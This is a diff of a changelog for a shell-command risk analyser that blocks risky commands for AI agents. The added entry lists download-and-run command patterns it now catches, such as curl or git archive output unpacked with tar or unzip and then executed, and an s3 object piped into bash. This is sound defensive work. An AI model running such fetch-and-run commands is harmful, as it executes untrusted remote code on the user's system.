@@ -105,6 +105,17 @@ follows semantic versioning.
   persistence. `export PATH=...` and `alias` lines analyse to nothing and
   stay allowed. A line that is itself flagged when run directly is flagged
   when written too.
+- **Running something from a fetched archive is caught.**
+  `curl -LO URL/a.tgz && tar xzf a.tgz && ./a/run`,
+  `curl -sL URL | tar xz && cd pkg && ./install.sh`,
+  `git archive --remote=R HEAD | tar -x && sh x.sh`, an `aws s3 cp` of a
+  zip unpacked with `unzip` and run, and the same through `7z x`, `bsdtar`,
+  `python -m zipfile -e`/`tarfile -e`, or `gunzip`/`xz -d` first, were
+  allowed: the download never names the file that runs. A fetched or
+  remotely read archive unpacked in the same command now marks what it
+  wrote (its `-C`/`-d`/`-o` directory, or the working directory), and
+  running a path from there scores like the plain download-and-run (review,
+  blocked for an agent). Unpacked and only listed or read stays allowed.
 - **Code read from an object store, a cluster, a container or another host
   is treated as fetched.** `aws s3 cp s3://b/k - | bash`,
   `source <(aws s3 cp s3://b/k -)`, `gsutil cat`/`gcloud storage cat` piped
@@ -152,10 +163,10 @@ follows semantic versioning.
 
 ### Project
 
-- The benchmark gate holds the new cases: 207 attacks caught, every command
+- The benchmark gate holds the new cases: 213 attacks caught, every command
   attack blocked for an agent, fetch-and-runs after `cd` into a temp
   directory denied, startup-file writes charged for what they write, and 0
-  of 144 ordinary commands flagged
+  of 148 ordinary commands flagged
   (including unparseable ones that only fetch or only run, `npx`/`uvx` runs
   of real packages, downloads through aria2c, axel and lwp-download that are
   not run, network one-liners that only print or save data, and `cd /tmp`
